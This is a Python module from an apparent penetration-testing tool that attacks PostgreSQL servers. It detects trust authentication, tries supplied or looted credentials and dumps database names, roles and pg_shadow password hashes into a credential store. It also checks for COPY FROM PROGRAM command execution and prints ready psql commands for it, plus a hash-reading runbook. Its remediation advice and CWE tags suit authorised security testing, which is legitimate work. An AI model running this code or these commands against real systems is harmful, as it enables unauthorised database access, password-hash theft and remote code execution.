"""Deep PostgreSQL enumeration (stdlib, read-only).

Speaks the Postgres v3 startup protocol to detect the highest-impact misconfiguration:
`trust` authentication - the server answers AuthenticationOk with NO password, so
anyone who can reach the port has full database access. We also read the advertised
server version. No credentials are sent beyond the connection parameters, and no
query is ever run, so this is safe and non-mutating.

Findings fold into the severity totals / Vulnerabilities sheet like the other deep
modules (source="postgres").
"""
from __future__ import annotations

import hashlib
import socket
import struct

from .models import Host, Port

_PORTS = (5432, 5433)
_DEFAULT_PORT = 5432
_TIMEOUT = 5.0
_PROTO_V3 = 196608                      # 3.0
_MAX_MSG = 64 * 1024


def is_postgres(port: Port) -> bool:
    if not port.is_open:
        return False
    svc = (port.service or "").lower()
    return port.portid in _PORTS or "postgres" in svc or svc == "postgresql"


def _recvn(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def _startup(user: str, db: str) -> bytes:
    params = f"user\x00{user}\x00database\x00{db}\x00\x00".encode()
    body = struct.pack("!I", _PROTO_V3) + params
    return struct.pack("!I", len(body) + 4) + body


def _read_message(sock: socket.socket):
    """Return (type_byte, body) or (None, b'')."""
    typ = _recvn(sock, 1)
    if not typ:
        return None, b""
    ln_raw = _recvn(sock, 4)
    if len(ln_raw) < 4:
        return None, b""
    ln = struct.unpack("!I", ln_raw)[0]
    body_len = max(0, min(ln - 4, _MAX_MSG))
    return typ, _recvn(sock, body_len)


def _server_version(sock: socket.socket) -> str:
    # After AuthenticationOk the server streams ParameterStatus ('S') messages; grab
    # server_version, stopping at ReadyForQuery ('Z') or after a few messages.
    for _ in range(20):
        typ, body = _read_message(sock)
        if typ is None or typ == b"Z":
            break
        if typ == b"S":
            parts = body.split(b"\x00")
            if len(parts) >= 2 and parts[0] == b"server_version":
                return parts[1].decode("utf-8", "replace")
    return ""


def _pg_error(body: bytes) -> str:
    # ErrorResponse: a series of field-code + null-terminated string; 'M' is the message.
    for field in body.split(b"\x00"):
        if field[:1] == b"M":
            return field[1:].decode("utf-8", "replace")
    return "error"


def _send(sock: socket.socket, tag: bytes, body: bytes) -> None:
    sock.sendall(tag + struct.pack("!I", len(body) + 4) + body)


def _do_auth(sock: socket.socket, user: str, password: str | None) -> bool:
    """Complete a Postgres auth handshake (the caller has already sent StartupMessage).
    Returns True on AuthenticationOk. Handles trust(0), cleartext(3), md5(5) and
    SASL/SCRAM-SHA-256(10). `password` may be None for the trust-only path."""
    typ, body = _read_message(sock)
    if typ != b"R" or len(body) < 4:
        return False
    code = struct.unpack("!I", body[:4])[0]
    if code == 0:                                    # AuthenticationOk (trust)
        return True
    if password is None:
        return False
    if code == 3:                                    # cleartext password
        _send(sock, b"p", password.encode() + b"\x00")
    elif code == 5:                                  # md5
        salt = body[4:8]
        inner = hashlib.md5((password + user).encode()).hexdigest().encode()
        token = b"md5" + hashlib.md5(inner + salt).hexdigest().encode()
        _send(sock, b"p", token + b"\x00")
    elif code == 10:                                 # SASL (SCRAM-SHA-256)
        mechs = [m.decode("ascii", "replace") for m in body[4:].split(b"\x00") if m]
        if "SCRAM-SHA-256" not in mechs:
            return False
        from . import scram
        client = scram.ScramClient(user, password, "SCRAM-SHA-256")
        first = client.first_message().encode()
        _send(sock, b"p", b"SCRAM-SHA-256\x00" + struct.pack("!I", len(first)) + first)
        typ, body = _read_message(sock)             # expect R / SASLContinue (11)
        if typ != b"R" or len(body) < 4 or struct.unpack("!I", body[:4])[0] != 11:
            return False
        final = client.final_message(body[4:].decode("utf-8", "replace")).encode()
        _send(sock, b"p", final)
        typ, body = _read_message(sock)             # SASLFinal (12) then AuthenticationOk
        if typ != b"R" or len(body) < 4:
            return False
        code = struct.unpack("!I", body[:4])[0]
        if code == 12:
            client.verify(body[4:].decode("utf-8", "replace"))
            typ, body = _read_message(sock)
            if typ != b"R" or len(body) < 4:
                return False
            code = struct.unpack("!I", body[:4])[0]
        return code == 0
    else:
        return False                                 # GSS/other: unsupported
    typ, body = _read_message(sock)                  # cleartext/md5 -> AuthenticationOk
    return typ == b"R" and len(body) >= 4 and struct.unpack("!I", body[:4])[0] == 0


def authenticate(ip: str, port: int, user: str, password: str,
                 timeout: float = _TIMEOUT, db: str = "postgres") -> bool:
    """Try one credential against a Postgres endpoint. Returns True if it logs in. No
    query is run; the connection is dropped right after AuthenticationOk."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(_startup(user, db))
            return _do_auth(sock, user, password)
    except (OSError, struct.error, ValueError):
        return False


def probe(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres") -> dict:
    res = {"reachable": False, "unauth": False, "auth_required": False,
           "version": "", "error": ""}
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.settimeout(timeout)
    except OSError as e:
        res["error"] = str(e)
        return res
    try:
        sock.sendall(_startup(user, "postgres"))
        res["reachable"] = True
        typ, body = _read_message(sock)
        if typ is None:
            res["error"] = "no response to startup"
        elif typ == b"R":
            code = struct.unpack("!I", body[:4])[0] if len(body) >= 4 else -1
            if code == 0:                       # AuthenticationOk with no password = trust
                res["unauth"] = True
                res["version"] = _server_version(sock)
            else:                               # 3 cleartext / 5 md5 / 10 SASL / other
                res["auth_required"] = True
        elif typ == b"E":
            res["error"] = _pg_error(body)
            res["auth_required"] = True
        return res
    except OSError as e:
        res["error"] = str(e)
        return res
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _read_until_ready(sock: socket.socket) -> None:
    """After AuthenticationOk, drain ParameterStatus/BackendKeyData up to ReadyForQuery."""
    for _ in range(100):
        typ, _body = _read_message(sock)
        if typ is None or typ == b"Z":          # ReadyForQuery
            return


def _simple_query(sock: socket.socket, sql: str) -> list[list]:
    """Run one simple query and return its rows (list of list of str|None). Read-only."""
    msg = sql.encode() + b"\x00"
    sock.sendall(b"Q" + struct.pack("!I", len(msg) + 4) + msg)
    rows: list[list] = []
    for _ in range(5000):
        typ, body = _read_message(sock)
        if typ is None or typ == b"Z":          # ReadyForQuery -> query done
            break
        if typ == b"D":                          # DataRow
            # Length-guard every read: a truncated/hostile response (RST mid-message, a
            # non-Postgres service that faked the handshake) must degrade to the rows
            # parsed so far, never raise struct.error out of loot() and abort the phase.
            if len(body) < 2:
                continue
            n = struct.unpack("!H", body[:2])[0]
            off, row = 2, []
            for _c in range(n):
                if off + 4 > len(body):
                    break
                ln = struct.unpack("!i", body[off:off + 4])[0]
                off += 4
                if ln == -1:
                    row.append(None)
                else:
                    row.append(body[off:off + ln].decode("utf-8", "replace"))
                    off += ln
            rows.append(row)
    return rows


def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
         password: str | None = None) -> dict:
    """Authenticated (trust, or with a supplied credential) -> pull read-only loot:
    databases, roles, pg_shadow hashes and the connected role's RCE capability. A
    superuser can read pg_shadow. SELECT only, no writes."""
    out = {"databases": [], "roles": [], "hashes": [], "current_user": user}
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.settimeout(timeout)
    except OSError:
        return out
    try:
        sock.sendall(_startup(user, "postgres"))
        if not _do_auth(sock, user, password):
            return out                           # auth failed
        _read_until_ready(sock)
        out["databases"] = [r[0] for r in _simple_query(
            sock, "SELECT datname FROM pg_database WHERE datistemplate=false ORDER BY 1")]
        for r in _simple_query(sock, "SELECT usename, passwd, usesuper FROM pg_shadow ORDER BY 1"):
            name, pw, sup = (r + [None, None, None])[:3]
            out["roles"].append({"name": name, "super": sup in ("t", "true", True)})
            if pw:
                out["hashes"].append({"user": name, "hash": pw})
        # RCE capability of the connected role: a superuser (or a member of
        # pg_execute_server_program on PG 11+) can run `COPY t FROM PROGRAM 'cmd'` for
        # OS command execution. pg_read/write_server_files give arbitrary file R/W.
        ident = _simple_query(sock, "SELECT current_user, "
                              "current_setting('is_superuser'), version()")
        if ident and ident[0]:
            row = (ident[0] + [None, None, None])[:3]
            out["current_user"] = row[0] or user
            out["is_superuser"] = str(row[1] or "").lower() in ("on", "true", "t", "yes")
            out["server_version"] = row[2] or ""
        # Role memberships (PG 11+; errors -> [] on older, harmless).
        priv = _simple_query(
            sock, "SELECT "
            "pg_has_role(current_user,'pg_execute_server_program','USAGE'),"
            "pg_has_role(current_user,'pg_read_server_files','USAGE'),"
            "pg_has_role(current_user,'pg_write_server_files','USAGE')")

        def _t(v):
            return str(v or "").lower() in ("t", "true", "on", "yes")
        if priv and priv[0]:
            p = (priv[0] + [None, None, None])[:3]
            out["can_copy_program"] = _t(p[0])
            out["can_read_files"] = _t(p[1])
            out["can_write_files"] = _t(p[2])
        out["can_rce"] = bool(out.get("is_superuser") or out.get("can_copy_program"))
        # RCE-relevant procedural-language extensions already installed.
        out["extensions"] = [r[0] for r in _simple_query(
            sock, "SELECT extname FROM pg_extension WHERE extname IN "
            "('plpythonu','plpython3u','plperlu','pltclu','plsh') ORDER BY 1")]
        try:
            sock.sendall(b"X" + struct.pack("!I", 4))   # Terminate, politely
        except OSError:
            pass
    except (OSError, struct.error, ValueError):
        # never let a malformed loot response escape and abort the Postgres phase -
        # the trust-auth finding (built later from the probe) must still be emitted.
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass
    return out


def _cred_list(creds) -> list[tuple]:
    """Normalize the analyze() `creds` arg (a single dict, or a list of them) into
    [(user, password), ...]. Accepts username/user + password/secret keys."""
    if not creds:
        return []
    if isinstance(creds, dict):
        creds = [creds]
    out, seen = [], set()
    for c in creds:
        if not isinstance(c, dict):
            continue
        u = c.get("username") or c.get("user")
        pw = c.get("password") if c.get("password") is not None else c.get("secret")
        if u and pw is not None and (u, pw) not in seen:
            seen.add((u, pw))
            out.append((u, pw))
    return out


def postgres_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_postgres(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "version": f"{p.product} {p.version}".strip()})
    return out


def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
    return {"severity": sev, "title": title, "target": target, "detail": detail,
            "tool": "psql", "command": cmd, "remediation": rem, "cwes": cwes, "kind": kind}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_postgres(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version") or ""
            if pr.get("unauth"):
                lt = pr.get("loot") or {}
                out.append(_finding(
                    "high", "PostgreSQL trust authentication (no password required)", tgt,
                    "The server accepted a v3 startup for user 'postgres' with NO "
                    "password (AuthenticationOk / `trust` in pg_hba.conf)"
                    + (f"; server_version {ver}" if ver else "")
                    + ". Anyone who can reach this port has full database access."
                    + _loot_text(lt),
                    f"psql 'host={h.ip} port={p.portid} user=postgres dbname=postgres'",
                    "Replace `trust` in pg_hba.conf with scram-sha-256 (or md5); bind to "
                    "localhost / a private interface; require TLS for remote access.",
                    ["CWE-306", "CWE-287"], kind="pg_trust_auth"))
                _rce_finding(out, tgt, h.ip, p.portid, lt)
            elif pr.get("cred_access"):
                lt = pr.get("loot") or {}
                who = pr.get("cred_user", "?")
                out.append(_finding(
                    "high", "PostgreSQL credentialed access (looted / weak credential)", tgt,
                    f"recce logged in as '{who}' with a credential from the engagement"
                    + (f"; server_version {ver}" if ver else "")
                    + ". The account has database access." + _loot_text(lt),
                    f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
                    "Rotate the credential; enforce least privilege; bind to a trusted "
                    "interface; require TLS.",
                    ["CWE-522", "CWE-284"], kind="pg_cred_access"))
                _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who)
    return out


def _loot_text(lt: dict) -> str:
    if not lt:
        return ""
    dbs = lt.get("databases", [])
    roles = lt.get("roles", [])
    hashes = lt.get("hashes", [])
    supers = [r["name"] for r in roles if r.get("super")]
    return (
        f"\n\nLOOTED (read-only): {len(dbs)} database(s): " + ", ".join(dbs[:10])
        + f"; {len(roles)} role(s)"
        + (f" (superuser: {', '.join(supers[:5])})" if supers else "")
        + (f"; {len(hashes)} password hash(es) captured (crackable) -> "
           + ", ".join(x["user"] for x in hashes[:8]) if hashes else ""))


def _rce_finding(out: list, tgt: str, ip: str, port: int, lt: dict,
                 credentialed: bool = False, user: str = "postgres") -> None:
    """Emit the COPY-FROM-PROGRAM RCE finding when the (trust or credentialed) role can
    reach it. Shared by both auth paths."""
    if not lt.get("can_rce"):
        return
    role = lt.get("current_user", user)
    how = ("superuser" if lt.get("is_superuser")
           else "member of pg_execute_server_program")
    exts = lt.get("extensions") or []
    ext_txt = f" Untrusted PL extensions installed: {', '.join(exts)}." if exts else ""
    filecap = []
    if lt.get("can_read_files"):
        filecap.append("arbitrary file read")
    if lt.get("can_write_files"):
        filecap.append("arbitrary file write")
    fc_txt = " Also: " + " + ".join(filecap) + "." if filecap else ""
    lead = "credentialed" if credentialed else "unauthenticated"
    src = "credentialed" if credentialed else "trust-auth"
    out.append(_finding(
        "critical",
        f"PostgreSQL {lead} RCE ({src} superuser -> COPY FROM PROGRAM)", tgt,
        f"The {'' if credentialed else 'trust-auth '}role '{role}' is a {how}, so "
        "`COPY t FROM PROGRAM 'cmd'` executes OS commands as the postgres service "
        f"account - {lead} remote code execution." + ext_txt + fc_txt,
        f"psql 'host={ip} port={port} user={role} dbname=postgres' "
        "-c \"CREATE TABLE r(o text); COPY r FROM PROGRAM 'id'; TABLE r;\"",
        "Never expose 5432; remove trust auth / rotate creds; run the app as a "
        "non-superuser; revoke pg_execute_server_program.",
        ["CWE-78", "CWE-306"], kind="pg_rce"))


def runbook(ip: str, port: int) -> list[dict]:
    return [{"step": "Test for trust auth (no password)",
             "cmd": f"psql 'host={ip} port={port} user=postgres dbname=postgres' -c '\\l'"},
            {"step": "If in: enumerate DBs / roles / read secrets",
             "cmd": "\\l   ;   \\du   ;   SELECT usename,passwd FROM pg_shadow;"}]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "postgres", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    from . import svcprobe
    targets = postgres_targets(hosts)
    probes: dict = {}
    state: dict = {}
    looted: list = []
    if active:
        from .models import Credential
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["unauth"] = pr.get("unauth", False)
                t["auth_required"] = pr.get("auth_required", False)
                t["version"] = pr.get("version", "") or t.get("version", "")
                lt = None
                if pr.get("unauth"):
                    lt = loot(t["ip"], t["port"])
                    pr["loot"] = lt
                    src, note = "postgres-loot", "pg_shadow hash from trust-auth PostgreSQL"
                elif pr.get("auth_required"):
                    # Credentialed follow-through: try each supplied/looted credential.
                    for cred in _cred_list(creds):
                        u, pw = cred
                        if authenticate(t["ip"], t["port"], u, pw):
                            pr["cred_access"] = True
                            pr["cred_user"] = u
                            lt = loot(t["ip"], t["port"], user=u, password=pw)
                            pr["loot"] = lt
                            t["cred_access"] = True
                            src = "postgres-loot"
                            note = f"pg_shadow hash via credentialed PostgreSQL ({u})"
                            break
                if lt:
                    for hh in lt.get("hashes", []):
                        looted.append(Credential(
                            username=hh["user"], secret=hh["hash"], kind="hash",
                            source=src, origin_ip=t["ip"],
                            notes=f"{note} :{t['port']}"))
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "credentials": looted,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "credentials": len(looted), "stopped": state.get("stopped")}}
